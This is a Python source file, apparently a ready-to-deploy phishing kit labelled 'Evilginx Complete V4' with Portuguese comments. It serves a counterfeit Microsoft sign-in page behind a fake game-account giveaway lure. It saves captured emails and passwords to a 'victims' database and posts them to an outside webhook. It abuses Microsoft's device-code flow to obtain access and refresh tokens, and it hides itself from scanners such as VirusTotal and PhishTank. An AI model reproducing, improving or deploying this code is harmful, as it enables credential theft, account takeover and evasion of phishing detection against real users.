#!/usr/bin/env python3
"""
EVILGINX COMPLETE V4 - VERSÃO FINAL CORRIGIDA
Interface Microsoft + Skins + Sorteio OG + Tokens
Todas as correções aplicadas - Pronto para deploy
"""

import secrets
import json
import datetime
import random
import time
import requests
import os
import sqlite3
import re
import threading
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from collections import deque

# ============================================================
# CONFIGURAÇÃO
# ============================================================

PORT = int(os.environ.get("PORT", 8080))
PUBLIC_URL = os.environ.get("PUBLIC_URL", f"http://localhost:{PORT}")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
DEVICE_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2"
MAX_SESSIONS = 100

# ============================================================
# ESTADO (limitado e thread-safe)
# ============================================================

captured_sessions = deque(maxlen=MAX_SESSIONS)

# Gerador de ID de sessão thread-safe
_counter = 0
_counter_lock = threading.Lock()

def get_next_session_id():
    global _counter
    with _counter_lock:
        _counter += 1
        return f"SID_{_counter}_{secrets.token_hex(8)}"

# ============================================================
# BANCO DE DADOS
# ============================================================

def init_db():
    with sqlite3.connect('captured.db') as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT, email TEXT, password TEXT, ip TEXT,
            user_agent TEXT, access_token TEXT, refresh_token TEXT
        )''')

def save_to_db(data):
    with sqlite3.connect('captured.db') as conn:
        conn.execute('''INSERT INTO victims (timestamp, email, password, ip, user_agent, access_token, refresh_token)
                       VALUES (?,?,?,?,?,?,?)''',
                     (data['timestamp'], data['email'], data['password'], data['ip'],
                      data['user_agent'], data.get('access_token', ''), data.get('refresh_token', '')))

init_db()

# ============================================================
# WEBHOOK
# ============================================================

def send_webhook(email, password, ip, access_token="", refresh_token=""):
    if not WEBHOOK_URL:
        return
    try:
        embed = {
            "title": "🎯 NOVA CONTA CAPTURADA!",
            "color": 0xff0000,
            "fields": [
                {"name": "📧 Email", "value": email, "inline": True},
                {"name": "🔑 Senha", "value": f"||{password}||", "inline": True},
                {"name": "🌐 IP", "value": ip, "inline": True}
            ]
        }
        if access_token:
            embed["fields"].append({"name": "🔐 Access Token", "value": f"||{access_token[:50]}...||", "inline": False})
        if refresh_token:
            embed["fields"].append({"name": "🔄 Refresh Token", "value": f"||{refresh_token[:50]}...||", "inline": False})
        response = requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
        response.raise_for_status()
    except Exception as e:
        print(f"[ERRO WEBHOOK] {e}")

# ============================================================
# DEVICE CODE (TOKENS REAIS)
# ============================================================

def start_device_flow():
    try:
        r = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
                         data={"client_id": DEVICE_CLIENT_ID, "scope": "https://graph.microsoft.com/.default offline_access"},
                         timeout=10)
        if r.status_code == 200:
            j = r.json()
            return j.get("user_code"), j.get("device_code"), j.get("verification_uri")
    except Exception as e:
        print(f"[DEVICE CODE ERRO] {e}")
    return None, None, None

def poll_for_token(device_code):
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    for _ in range(60):
        try:
            r = requests.post(url, data={
                "client_id": DEVICE_CLIENT_ID,
                "device_code": device_code,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
            }, timeout=5)
            if r.status_code == 200:
                j = r.json()
                return j.get("access_token", ""), j.get("refresh_token", "")
        except:
            pass
        time.sleep(5)
    return "", ""

# ============================================================
# VALIDAÇÃO
# ============================================================

def is_valid_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))

def sanitize_html(text):
    if not text:
        return ""
    return (text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace('"', "&quot;")
                .replace("'", "&#39;"))

def escape_js_string(text):
    """Escapa string para uso seguro dentro de JavaScript"""
    if not text:
        return ""
    return json.dumps(str(text))

def is_bot(headers):
    ua = headers.get('User-Agent', '').lower()
    bots = ['googlebot', 'bingbot', 'ahrefsbot', 'semrushbot', 'virustotal', 'phishtank', 'urlscan']
    return any(bot in ua for bot in bots)

# ============================================================
# SERVIDOR HTTP
# ============================================================

class EvilginxHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def _send(self, status, content_type, body):
        self.send_response(status)
        self.send_header('Content-type', content_type)
        self.end_headers()
        self.wfile.write(body if isinstance(body, bytes) else body.encode())

    def do_GET(self):
        path = urlparse(self.path).path
        if is_bot(self.headers):
            self._send(200, "text/html", b"Microsoft 365")
            return
        
        if path == '/':
            self._serve_login()
        elif path == '/dashboard':
            self._serve_dashboard()
        elif path == '/qrcode':
            self._serve_qrcode()
        elif path == '/device/poll':
            self._handle_poll()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path
        if path == '/auth':
            self._handle_auth()
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_poll(self):
        query = parse_qs(urlparse(self.path).query)
        device_code = query.get('device_code', [None])[0]
        if not device_code:
            self._send(400, "application/json", json.dumps({"error": "missing device_code"}))
            return
        access, refresh = poll_for_token(device_code)
        self._send(200, "application/json", json.dumps({"access_token": access, "refresh_token": refresh}))

    def _serve_qrcode(self):
        user_code, device_code, ver_uri = start_device_flow()
        qr_url = sanitize_html(ver_uri if device_code else PUBLIC_URL)
        manual = f'<p><strong>Código manual:</strong> {sanitize_html(user_code)}</p>' if user_code else ''
        device_safe = escape_js_string(device_code) if device_code else ""

        html = f'''<!DOCTYPE html>
<html><head><title>QR Code - Tokens</title>
<style>body{{background:#1a1a2e;color:white;text-align:center;padding:20px;}}</style></head>
<body>
<h1>📱 Escaneie para autorizar sua conta Microsoft</h1>
{manual}
<div id="qrcode"></div>
<button onclick="pollToken()">🔍 Obter Token</button>
<div id="tokenResult"></div>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
<script>
new QRCode(document.getElementById("qrcode"),{{text:'{qr_url}',width:250,height:250}});
let deviceCode = {device_safe};
async function pollToken() {{
    if(!deviceCode) {{ document.getElementById('tokenResult').innerHTML = 'Falha'; return; }}
    let resp = await fetch(`/device/poll?device_code=${{encodeURIComponent(deviceCode)}}`);
    let data = await resp.json();
    if(data.access_token) {{
        document.getElementById('tokenResult').innerHTML = '✅ Access Token: ' + data.access_token.slice(0,50) + '...<br>✅ Refresh Token: ' + data.refresh_token.slice(0,50) + '...';
    }} else {{
        document.getElementById('tokenResult').innerHTML = '⏳ Aguardando autorização...';
    }}
}}
</script>
<a href="/">Voltar</a>
</body></html>'''
        self._send(200, "text/html", html)

    def _serve_login(self):
        session_id = get_next_session_id()
        og_name = random.choice(["KILL", "HERO", "GOLD", "STAR", "MOON", "FIRE", "SNOW", "LIFE"])

        html = f'''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na sua conta - Microsoft</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
            background: #f1f1f1;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .login-container {{
            background: white;
            max-width: 440px;
            width: 100%;
            padding: 44px;
            border-radius: 4px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .microsoft-logo svg {{
            width: 108px;
            height: 23px;
            margin-bottom: 28px;
        }}
        h1 {{ font-size: 24px; font-weight: 600; margin-bottom: 16px; }}
        .input-field {{
            width: 100%;
            padding: 12px;
            font-size: 15px;
            border: 1px solid #8a8a8a;
            border-radius: 2px;
            margin-bottom: 20px;
        }}
        .input-field:focus {{ border-color: #0067b8; outline: none; }}
        .sign-in-btn {{
            width: 100%;
            background: #0067b8;
            color: white;
            border: none;
            padding: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            border-radius: 2px;
        }}
        .sign-in-btn:hover {{ background: #004c8f; }}
        .links {{ margin-top: 24px; }}
        .links a {{ color: #0067b8; text-decoration: none; font-size: 13px; margin-right: 20px; }}
        .footer {{ margin-top: 32px; font-size: 11px; color: #666; text-align: center; }}
        .step-2 {{ display: none; }}
        .user-badge {{
            display: flex;
            align-items: center;
            gap: 12px;
            background: #f5f5f5;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
        }}
        .error-message {{ color: #d13438; font-size: 12px; margin-bottom: 10px; display: none; }}
        .event-banner {{
            background: linear-gradient(135deg, #ffd700, #ffb347);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            color: #1a1a2e;
        }}
        .skin-name {{ font-weight: bold; color: #e94560; }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="event-banner">
            🎁 EVENTO ESPECIAL! 🎁<br>
            <strong>Sorteio de conta <span class="skin-name">"{og_name}"</span> (4 letras - RARA!)</strong><br>
            + Skin ENDER PHOENIX GRÁTIS para todos que verificarem!
        </div>

        <div class="microsoft-logo">
            <svg viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="2" y="2" width="8" height="8" fill="#F25022"/>
                <rect x="12" y="2" width="8" height="8" fill="#7FBA00"/>
                <rect x="2" y="12" width="8" height="8" fill="#00A4EF"/>
                <rect x="12" y="12" width="8" height="8" fill="#FFB900"/>
                <path d="M32 18V4H35.5L41 13.2L46.5 4H50V18H46.5V9.4L41 18.6L35.5 9.4V18H32Z" fill="#1E1E1E"/>
                <path d="M58 18V4H68V7.2H61.5V9.8H67V13H61.5V14.8H68V18H58Z" fill="#1E1E1E"/>
                <path d="M74 18V4H84V7.2H77.5V9.8H83V13H77.5V14.8H84V18H74Z" fill="#1E1E1E"/>
                <path d="M90 18V4H100V7.2H93.5V9.8H99V13H93.5V14.8H100V18H90Z" fill="#1E1E1E"/>
            </svg>
        </div>

        <div id="step1">
            <h1>Entrar</h1>
            <form id="emailForm">
                <input type="email" id="email" class="input-field" placeholder="Email, telefone ou Skype" autofocus>
                <div id="emailError" class="error-message"></div>
                <button type="submit" class="sign-in-btn">Avançar</button>
            </form>
        </div>

        <div id="step2" class="step-2">
            <div class="user-badge">
                <div style="width:40px;height:40px;background:#0067b8;border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;">👤</div>
                <div>
                    <div id="userEmailDisplay" style="font-size:14px;font-weight:500;"></div>
                    <a href="#" onclick="resetToStep1();return false;" style="font-size:12px;color:#0067b8;">Alterar conta</a>
                </div>
            </div>
            <h1>Inserir senha</h1>
            <form id="passwordForm">
                <div style="position:relative;">
                    <input type="password" id="password" class="input-field" placeholder="Senha">
                    <button type="button" onclick="togglePassword()" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;">👁️</button>
                </div>
                <div id="passwordError" class="error-message"></div>
                <button type="submit" class="sign-in-btn">Entrar</button>
            </form>
        </div>

        <div class="links">
            <a href="#">Criar uma conta!</a>
            <a href="#" style="margin-left:20px;">Esqueceu sua senha?</a>
        </div>
        <div class="footer">
            <a href="#">Termos de uso</a> &nbsp;|&nbsp;
            <a href="#">Política de Privacidade</a>
        </div>
    </div>

    <script>
        let capturedEmail = '';
        let sessionId = '{session_id}';
        let pageStartTime = Date.now();

        function togglePassword() {{
            const pwd = document.getElementById('password');
            pwd.type = pwd.type === 'password' ? 'text' : 'password';
        }}

        function resetToStep1() {{
            document.getElementById('step1').style.display = 'block';
            document.getElementById('step2').style.display = 'none';
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
        }}

        document.getElementById('emailForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            const email = document.getElementById('email').value;
            const emailError = document.getElementById('emailError');
            
            if (!email || !email.includes('@')) {{
                emailError.textContent = 'Digite um endereço de email válido';
                emailError.style.display = 'block';
                return;
            }}
            
            emailError.style.display = 'none';
            capturedEmail = email;
            document.getElementById('userEmailDisplay').textContent = email;
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            document.getElementById('password').focus();
        }});

        document.getElementById('passwordForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            const password = document.getElementById('password').value;
            const passwordError = document.getElementById('passwordError');
            
            if (!password) {{
                passwordError.textContent = 'Digite sua senha';
                passwordError.style.display = 'block';
                return;
            }}
            
            passwordError.style.display = 'none';
            const timeOnPage = Math.floor((Date.now() - pageStartTime) / 1000);
            
            fetch('/auth', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    email: capturedEmail,
                    password: password,
                    session_id: sessionId,
                    user_agent: navigator.userAgent,
                    time_on_page: timeOnPage
                }})
            }}).then(() => {{
                window.location.href = 'https://www.microsoft.com/pt-br';
            }});
        }});
    </script>
</body>
</html>'''
        self._send(200, "text/html", html)

    def _handle_auth(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            self._send(400, "text/plain", "Bad JSON")
            return

        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        user_agent = data.get('user_agent', '')[:200]
        ip = self.client_address[0]

        if not is_valid_email(email) or not password:
            self._send(400, "text/plain", "Invalid data")
            return

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        captured_sessions.append({
            "timestamp": timestamp, "email": email,
            "password": password, "ip": ip, "user_agent": user_agent
        })

        save_to_db({'timestamp': timestamp, 'email': email, 'password': password,
                    'ip': ip, 'user_agent': user_agent})

        send_webhook(email, password, ip)

        print(f"\n[{timestamp}] 🎯 CAPTURADA! Email: {email} | Senha: {password} | IP: {ip}")
        self._send(200, "application/json", json.dumps({"status": "ok"}))

    def _serve_dashboard(self):
        rows = ""
        for c in captured_sessions:
            rows += f'<tr><td>{c["timestamp"]}</td><td>{c["email"]}</td><td>{c["password"]}</td><td>{c["ip"]}</td></tr>'

        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - Evilginx</title>
    <style>
        body {{ background: #0f0f1a; color: #cdd6f4; font-family: monospace; padding: 20px; }}
        table {{ width: 100%; border-collapse: collapse; background: #1e1e2e; }}
        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #313244; }}
        th {{ background: #313244; }}
        a {{ color: #89b4fa; }}
    </style>
</head>
<body>
    <h1>🎯 DASHBOARD - EVILGINX</h1>
    <p>Total capturas realizadas: {len(captured_sessions)}</p>
    <table>
        <thead>
            <tr>
                <th>Data/Hora</th>
                <th>Email</th>
                <th>Senha</th>
                <th>IP</th>
            </tr>
        </thead>
        <tbody>
            {rows}
        </tbody>
    </table>
    <br>
    <a href="/">← Voltar para página de login</a>
    <a href="/qrcode" style="margin-left: 15px;">🎯 QR Code (Obter Tokens)</a>
</body>
</html>'''
        self._send(200, "text/html", html)

# ============================================================
# EXECUÇÃO
# ============================================================

def run():
    print("=" * 70)
    print("🎯 EVILGINX COMPLETE V4 - VERSÃO FINAL CORRIGIDA")
    print("=" * 70)
    print(f"📡 Servidor: {PUBLIC_URL}")
    print(f"🎁 Página de login (Microsoft): {PUBLIC_URL}")
    print(f"📊 Dashboard: {PUBLIC_URL}/dashboard")
    print(f"🎯 QR Code (Tokens reais): {PUBLIC_URL}/qrcode")
    print("=" * 70)
    print("✅ Correções aplicadas:")
    print("   - BaseHTTPRequestHandler importado")
    print("   - Dashboard HTML corrigido (tabela válida)")
    print("   - click_stats removido (não utilizado)")
    print("   - Tratamento específico para JSONDecodeError")
    print("   - raise_for_status() no webhook")
    print("   - escape_js_string() para segurança em JS")
    print("=" * 70)

    server = ThreadingHTTPServer(("0.0.0.0", PORT), EvilginxHandler)
    server.serve_forever()

if __name__ == "__main__":
    run()
